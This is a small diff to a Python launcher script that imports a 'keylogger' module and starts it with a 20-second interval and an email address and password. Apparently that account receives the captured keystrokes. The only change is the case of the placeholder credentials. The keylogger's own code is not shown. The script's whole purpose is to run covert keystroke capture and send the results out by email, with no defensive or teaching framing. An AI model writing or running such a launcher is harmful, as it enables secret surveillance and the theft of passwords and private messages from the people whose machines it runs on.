@@ -1,5 +1,5 @@
 #!/usr/bin/env python
 import keylogger
 
-my_keylogger = keylogger.Keylogger(20 , "Email@gmail.com", "Password")
+my_keylogger = keylogger.Keylogger(20 , "email@gmail.com", "password")
 my_keylogger.start()
